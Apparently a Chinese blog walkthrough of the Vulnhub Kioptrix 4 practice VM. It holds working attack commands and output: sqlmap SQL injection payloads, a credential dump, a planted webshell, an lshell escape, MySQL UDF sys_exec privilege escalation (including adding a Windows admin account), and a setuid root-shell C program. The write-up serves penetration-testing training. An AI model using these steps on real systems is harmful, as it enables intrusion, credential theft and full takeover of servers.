<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Vulnhub渗透测试练习-Kioptrix 4 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="Vulnhub渗透测试练习-Kioptrix 4 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">Vulnhub渗透测试练习-Kioptrix 4</h1><div class="post-time">May 17, 2018</div><div class="post-content"><!-- ttoc -->
<h3><span id="xin-xi-shou-ji">信息收集</span><a href="#xin-xi-shou-ji" class="header-anchor">#</a></h3><p>用<code>nmap</code>进行端口扫描。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A 10.32.58.187</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 01:57 EDT</span><br><span class="line">Nmap scan report for 10.32.58.187</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 566 closed ports, 430 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)</span><br><span class="line">|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:38:2D:6F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 10h00m00s, deviation: 2h49m43s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.28a)</span><br><span class="line">|   Computer name: Kioptrix4</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: Kioptrix4.localdomain</span><br><span class="line">|_  System time: 2018-05-17T09:58:07-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.37 ms 10.32.58.187</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds</span><br></pre></td></tr></table></figure>
<p>从扫描结果可以得到，开发以下端口信息</p>
<ul>
<li>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</li>
<li>80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</li>
<li>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</li>
<li>445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</li>
</ul>
<p>访问80端口下的WEB服务。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix4_1.png" alt=""></p>
<p>尝试万能密码绕过<code>&#39;or 1=1#</code> 绕过失败。</p>
<p>弱密码<code>admin:admin</code>也是错误的。</p>
<p>尝试<code>admin:&#39;</code>，出现报错。好爆出来了路径<code>/var/www/checklogin.php</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix4_2.png" alt=""></p>
<p>存在POST型注入。</p>
<h2><span id="lou-dong-li-yong">漏洞利用</span><a href="#lou-dong-li-yong" class="header-anchor">#</a></h2><h3><span id="sqlmap-jin-xing-sql-zhu-ru">sqlmap进行SQL注入</span><a href="#sqlmap-jin-xing-sql-zhu-ru" class="header-anchor">#</a></h3><p><code>sqlmap -u http://10.32.58.187/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --current-user --current-db --is-dba</code></p>
<p>在注入的过程会遇到<code>302跳转</code>选择<code>n</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 253 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-8260&apos; OR 6555=6555#&amp;Submit=Login</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123&apos; OR SLEEP(5)-- UeQF&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[02:00:45] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="line">web application technology: PHP 5.2.4, Apache 2.2.8</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[02:00:45] [INFO] fetching current user</span><br><span class="line">[02:00:45] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval</span><br><span class="line">[02:00:45] [INFO] retrieved: root@localhost</span><br><span class="line">current user:    &apos;root@localhost&apos;</span><br><span class="line">[02:00:45] [INFO] fetching current database</span><br><span class="line">[02:00:45] [INFO] retrieved: members</span><br><span class="line">current database:    &apos;members&apos;</span><br><span class="line">[02:00:45] [INFO] testing if current user is DBA</span><br><span class="line">[02:00:45] [INFO] fetching current user</span><br><span class="line">current user is DBA:    True</span><br><span class="line">[02:00:45] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/10.32.58.187&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 02:00:45</span><br></pre></td></tr></table></figure>
<p>通过注入得到用户名和密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: members</span><br><span class="line">Table: members</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+-----------------------+</span><br><span class="line">| id | username | password              |</span><br><span class="line">+----+----------+-----------------------+</span><br><span class="line">| 1  | john     | MyNameIsJohn          |</span><br><span class="line">| 2  | robert   | ADGAdsafdfwt4gadfga== |</span><br><span class="line">+----+----------+-----------------------+</span><br></pre></td></tr></table></figure>
<p>通过<code>--os-shell</code>写入一个<code>webshell</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u http://10.32.58.187/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&apos;]_____ ___ ___  &#123;1.2.4#stable&#125;</span><br><span class="line">|_ -| . [.]     | .&apos;| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 02:09:06</span><br><span class="line"></span><br><span class="line">[02:09:06] [INFO] resuming back-end DBMS &apos;mysql&apos; </span><br><span class="line">[02:09:06] [INFO] testing connection to the target URL</span><br><span class="line">[02:09:06] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-8260&apos; OR 6555=6555#&amp;Submit=Login</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123&apos; OR SLEEP(5)-- UeQF&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[02:09:06] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="line">web application technology: PHP 5.2.4, Apache 2.2.8</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[02:09:06] [INFO] going to use a web backdoor for command prompt</span><br><span class="line">[02:09:06] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[02:09:06] [INFO] the back-end DBMS operating system is Linux</span><br><span class="line">which web application language does the web server support?</span><br><span class="line">[1] ASP</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP (default)</span><br><span class="line">&gt; 4</span><br><span class="line">[02:09:08] [INFO] retrieved the web server document root: &apos;/var/www&apos;</span><br><span class="line">[02:09:08] [INFO] retrieved web server absolute paths: &apos;/var/www/checklogin.php&apos;</span><br><span class="line">[02:09:08] [INFO] trying to upload the file stager on &apos;/var/www/&apos; via LIMIT &apos;LINES TERMINATED BY&apos; method</span><br><span class="line">[02:09:08] [INFO] the file stager has been successfully uploaded on &apos;/var/www/&apos; - http://10.32.58.187:80/tmpuadle.php</span><br><span class="line">[02:09:08] [WARNING] unable to upload the file through the web file stager to &apos;/var/www/&apos;</span><br><span class="line">[02:09:08] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder where the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers</span><br><span class="line">do you want to try the same method used for the file stager? [Y/n] </span><br><span class="line">[02:09:09] [INFO] the backdoor has been successfully uploaded on &apos;/var/www/&apos; - http://10.32.58.187:80/tmpbcphh.php</span><br><span class="line">[02:09:09] [INFO] calling OS shell. To quit type &apos;x&apos; or &apos;q&apos; and press ENTER</span><br><span class="line">os-shell&gt; id</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:    &apos;uid=33(www-data) gid=33(www-data) groups=33(www-data)&apos;</span><br><span class="line">os-shell&gt; whoami</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:    &apos;www-data&apos;</span><br><span class="line">os-shell&gt; cat checklogin.php</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:</span><br><span class="line">---</span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">$host=&quot;localhost&quot;; // Host name</span><br><span class="line">$username=&quot;root&quot;; // Mysql username</span><br><span class="line">$password=&quot;&quot;; // Mysql password</span><br><span class="line">$db_name=&quot;members&quot;; // Database name</span><br><span class="line">$tbl_name=&quot;members&quot;; // Table name</span><br></pre></td></tr></table></figure>
<p>但是权限很小。但是得到了数据库的账号密码。</p>
<h3><span id="tong-guo-ssh-lian-jie">通过SSH连接</span><a href="#tong-guo-ssh-lian-jie" class="header-anchor">#</a></h3><p>利用SQL注入得到的用户名密码SSH登录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh john@10.32.58.187</span><br><span class="line">The authenticity of host &apos;10.32.58.187 (10.32.58.187)&apos; can&apos;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;10.32.58.187&apos; (RSA) to the list of known hosts.</span><br><span class="line">john@10.32.58.187&apos;s password: </span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is in place so you  don&apos;t screw up</span><br><span class="line">Type &apos;?&apos; or &apos;help&apos; to get the list of allowed commands</span><br><span class="line">john:~$ id</span><br><span class="line">*** unknown command: id</span><br><span class="line">john:~$ ?</span><br><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br><span class="line">john:~$ help help</span><br><span class="line">Limited Shell (lshell) limited help.</span><br><span class="line">Cheers.</span><br></pre></td></tr></table></figure>
<p>从这里我们可以利用的命令有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br></pre></td></tr></table></figure>
<p>重点其中有一个是<code>echo</code>。</p>
<p>我们可以利用他得到一个<code>bash交互shell</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john:~$ echo os.system(&apos;/bin/bash&apos;)     </span><br><span class="line">john@Kioptrix4:~$ id</span><br><span class="line">uid=1001(john) gid=1001(john) groups=1001(john)</span><br></pre></td></tr></table></figure>
<p>权限还是当前用户的权限。</p>
<h3><span id="mysql-shu-ju-ku-ti-quan">MySQL数据库提权</span><a href="#mysql-shu-ju-ku-ti-quan" class="header-anchor">#</a></h3><p>利用SQL注入得到的数据库账号密码登录MySQL数据库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3520</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; status;</span><br><span class="line">--------------</span><br><span class="line">mysql  Ver 14.12 Distrib 5.0.51a, for debian-linux-gnu (i486) using readline 5.2</span><br><span class="line"></span><br><span class="line">Connection id:		3520</span><br><span class="line">Current database:	</span><br><span class="line">Current user:		root@localhost</span><br><span class="line">SSL:			Not in use</span><br><span class="line">Current pager:		stdout</span><br><span class="line">Using outfile:		&apos;&apos;</span><br><span class="line">Using delimiter:	;</span><br><span class="line">Server version:		5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line">Protocol version:	10</span><br><span class="line">Connection:		Localhost via UNIX socket</span><br><span class="line">Server characterset:	latin1</span><br><span class="line">Db     characterset:	latin1</span><br><span class="line">Client characterset:	latin1</span><br><span class="line">Conn.  characterset:	latin1</span><br><span class="line">UNIX socket:		/var/run/mysqld/mysqld.sock</span><br><span class="line">Uptime:			1 hour 10 min 47 sec</span><br></pre></td></tr></table></figure>
<p>尝试<code>mysql udf 提权</code>。</p>
<p>在Windows环境下，执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br><span class="line">CREATE TABLE npn(line blob);</span><br><span class="line">INSERT INTO npn values(load_file(&apos;C://xampplite//htdocs//mail//lib_mysqludf_sys.dll&apos;));</span><br><span class="line">SELECT * FROM mysql.npn INTO DUMPFILE &apos;c://windows//system32//lib_mysqludf_sys_32.dll&apos;;</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS integer SONAME &apos;lib_mysqludf_sys_32.dll&apos;;</span><br><span class="line">SELECT sys_exec(&quot;net user npn npn12345678 /add&quot;);</span><br><span class="line">SELECT sys_exec(&quot;net localgroup Administrators npn /add&quot;);</span><br></pre></td></tr></table></figure></p>
<p>实现提权。</p>
<p>我们在实验环境下进行Linux环境下的UDF提权操作。</p>
<p>首先找到<code>lib_mysqludf_sys.so</code>的目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create function sys_exec returns integer soname &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">ERROR 1125 (HY000): Function &apos;sys_exec&apos; already exists</span><br><span class="line">mysql&gt; select sys_exec(&apos;id &gt; /tmp/out; chown john.john /tmp/out&apos;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    1</span><br><span class="line">Current database: mysql</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| sys_exec(&apos;id &gt; /tmp/out; chown john.john /tmp/out&apos;) |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| NULL                                                | </span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br><span class="line">john@Kioptrix4:~$ cat /tmp/out</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>
<p>这样就将<code>sys_exec()</code>函数执行的结果写入到了<code>/tmp/out</code>下。</p>
<p>得知可以得到root权限。</p>
<p>可以写一个c语言程序进行命令执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">setuid(0); setgid(0); system(“/bin/bash”);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本地编译上传到目标靶机。</p>
<p>这里我用wget下载好像一下连接超时。可能是防火墙阻止流量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT sys_exec(&apos;usermod -a -G admin&apos;);</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt; SELECT sys_exec(&apos;usermod -a -G admin john&apos;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    1</span><br><span class="line">Current database: mysql</span><br><span class="line"></span><br><span class="line">+--------------------------------------+</span><br><span class="line">| sys_exec(&apos;usermod -a -G admin john&apos;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| NULL                                 | </span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.07 sec)</span><br></pre></td></tr></table></figure>
<p>利用<code>SELECT sys_exec(&#39;usermod -a -G admin&#39;);</code>将<code>john</code>加入管理员组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:/tmp$ sudo su</span><br><span class="line">[sudo] password for john: </span><br><span class="line">root@Kioptrix4:/tmp# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Kioptrix4:/tmp# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>这样我们得到了root权限。</p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/Web中常见的绕过和技巧总结.html" class="prev">上一篇</a><a href="/posts/notes/Vulnhub渗透测试练习-Kioptrix-3.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>